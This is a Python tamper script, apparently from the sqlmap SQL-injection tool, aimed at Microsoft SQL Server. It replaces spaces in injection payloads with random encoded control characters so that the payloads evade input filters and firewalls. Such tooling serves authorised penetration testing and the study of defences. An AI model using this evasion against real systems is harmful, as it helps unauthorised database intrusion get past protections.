import os
import random

from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):

    blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True

            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += random.choice(blanks[:-1])
                else:
                    retVal += random.choice(blanks)

                continue

            retVal += payload[i]

    return retVal
